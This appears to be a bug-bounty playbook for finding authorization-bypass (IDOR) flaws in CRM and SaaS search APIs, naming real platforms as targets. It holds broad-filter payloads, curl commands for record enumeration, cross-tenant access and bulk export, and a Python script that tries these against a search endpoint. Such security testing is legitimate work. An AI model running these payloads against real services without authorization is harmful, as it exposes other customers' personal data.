# 🎯 IDOR Pattern Playbook - CRM/SaaS Search APIs

## Proven Pattern: Search API Authorization Bypass

**Success Story**: HubSpot - $1,700-$3,500 bounty (August 2025)

---

## 🔍 Target Identification

### High-Value Indicators
- **Platform Type**: CRM, SaaS, Business Management
- **API Presence**: REST API, GraphQL endpoints
- **Search Features**: Advanced filtering, query builders
- **Authentication**: Token-based, OAuth2
- **Multi-tenancy**: Shared infrastructure, portal/workspace model

### Prime Targets
1. **Salesforce** - SOQL queries, REST API
2. **Pipedrive** - /v1/persons, /v1/deals
3. **Zoho CRM** - CRM and Desk APIs
4. **Monday.com** - GraphQL API
5. **Freshworks** - Multiple product APIs
6. **Microsoft Dynamics** - OData queries
7. **Intercom** - Contacts API
8. **Zendesk** - Search API
9. **Slack** - Workspace APIs
10. **Notion** - Database queries

---

## 🛠️ Testing Methodology

### Step 1: Account Setup
```bash
# Create trial/free account
# Obtain API credentials with minimal permissions
# Document portal/workspace ID
```

### Step 2: API Discovery
```bash
# Common endpoints to test
/api/v*/search
/api/v*/contacts/search
/api/v*/customers/search
/api/v*/users/search
/api/v*/objects/*/search
/api/v*/query
/graphql
```

### Step 3: IDOR Test Payloads

#### Generic Search Filter
```json
{
  "filterGroups": [{
    "filters": [{
      "propertyName": "id",
      "operator": "GT",
      "value": "0"
    }]
  }],
  "limit": 100
}
```

#### GraphQL Query
```graphql
query {
  contacts(first: 100, where: {id_gt: 0}) {
    edges {
      node {
        id
        email
        name
      }
    }
  }
}
```

#### OData Query
```
/api/contacts?$filter=id gt 0&$top=100
```

#### SOQL Query (Salesforce)
```
SELECT Id, Email, Name FROM Contact WHERE Id != null LIMIT 100
```

### Step 4: Validation Tests

#### Test 1: Enumerate All Objects
```bash
curl -X POST "[API_URL]/search" \
  -H "Authorization: Bearer [TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{"filters":[{"property":"id","operator":"GT","value":"0"}],"limit":100}'
```

#### Test 2: Cross-Tenant Access
```bash
# Try accessing objects with IDs from different portal/workspace
curl -X GET "[API_URL]/contacts/[OTHER_TENANT_ID]" \
  -H "Authorization: Bearer [TOKEN]"
```

#### Test 3: Bulk Export
```bash
curl -X POST "[API_URL]/export" \
  -H "Authorization: Bearer [TOKEN]" \
  -d '{"object":"contacts","filters":[]}'
```

#### Test 4: Association Traversal
```bash
# Access related objects through associations
curl -X GET "[API_URL]/contacts/[ID]/companies" \
  -H "Authorization: Bearer [TOKEN]"
```

---

## 📊 Evidence Collection

### Required Proof
1. **API Request**: Full curl command with headers
2. **API Response**: JSON showing unauthorized data
3. **PII Evidence**: Emails, names, phone numbers exposed
4. **Count**: Total number of records accessible
5. **Cross-Tenant**: Proof of accessing other customers' data (if applicable)

### Documentation Template
```markdown
## IDOR Vulnerability in [Platform] Search API

### Steps to Reproduce
1. Create account at [URL]
2. Get API token with read-only permissions
3. Execute: [curl command]
4. Observe: Returns all [X] records including PII

### Evidence
[JSON response showing multiple records]

### Impact
- Unauthorized access to [X] customer records
- PII exposure: [list types]
- Business impact: [describe]

### CVSS Score: [Calculate]
```

---

## 🎯 Success Indicators

### Vulnerable Patterns
- ✅ Returns more records than authorized
- ✅ No permission checks on search filters
- ✅ Can enumerate sequential IDs
- ✅ Bulk operations bypass limits
- ✅ Association traversal works

### Not Vulnerable
- ❌ Returns only authorized records
- ❌ Proper tenant isolation
- ❌ Search results filtered by permissions
- ❌ Rate limiting prevents enumeration
- ❌ Requires elevated privileges

---

## 💰 Bounty Expectations

### Severity Mapping
- **Critical**: Cross-tenant data access ($5,000+)
- **High**: Full database enumeration ($2,000-$5,000)
- **Medium**: Limited PII exposure ($1,000-$2,000)
- **Low**: Metadata only ($200-$500)

### Factors Affecting Bounty
- Amount of data exposed
- Sensitivity of information
- Ease of exploitation
- Program maturity
- Previous submissions

---

## 🚀 Automation Script

```python
#!/usr/bin/env python3
import requests
import json

def test_idor(api_url, token):
    """Test for IDOR vulnerability in search API"""
    
    headers = {
        'Authorization': f'Bearer {token}',
        'Content-Type': 'application/json'
    }
    
    # Test payloads
    payloads = [
        {"filters": [{"property": "id", "operator": "GT", "value": "0"}]},
        {"query": {"match_all": {}}},
        {"where": {"id": {"$gt": 0}}},
        {"filter": "id gt 0"}
    ]
    
    for payload in payloads:
        try:
            response = requests.post(
                f"{api_url}/search",
                headers=headers,
                json=payload
            )
            
            if response.status_code == 200:
                data = response.json()
                if len(data.get('results', [])) > 0:
                    print(f"✅ POTENTIAL IDOR: {len(data['results'])} records found")
                    return True
        except:
            continue
    
    print("❌ No IDOR found")
    return False

# Usage
test_idor("https://api.example.com", "your_token_here")
```

---

## 📝 Lessons from HubSpot

### What Worked
1. **Broad filters** bypassed authorization
2. **Search API** had different permission model
3. **Multiple findings** increased total bounty
4. **Expert validation** prevented false positives

### Key Insights
1. Always test search/filter endpoints
2. Look for developer-friendly APIs
3. Check if results match UI permissions
4. Test with minimal privileges
5. Document everything thoroughly

---

## 🔄 Continuous Improvement

### After Each Test
1. Update this playbook with findings
2. Store successful patterns in Qdrant
3. Share with community (after disclosure)
4. Refine automation scripts
5. Track success rates

### Success Metrics
- Programs tested: [Track count]
- Success rate: [Calculate %]
- Total bounties: [Sum earnings]
- Average per program: [Calculate]
- Time to find: [Track hours]

---

**Last Updated**: August 20, 2025  
**Author**: BBHK Security Team  
**Status**: Proven and Profitable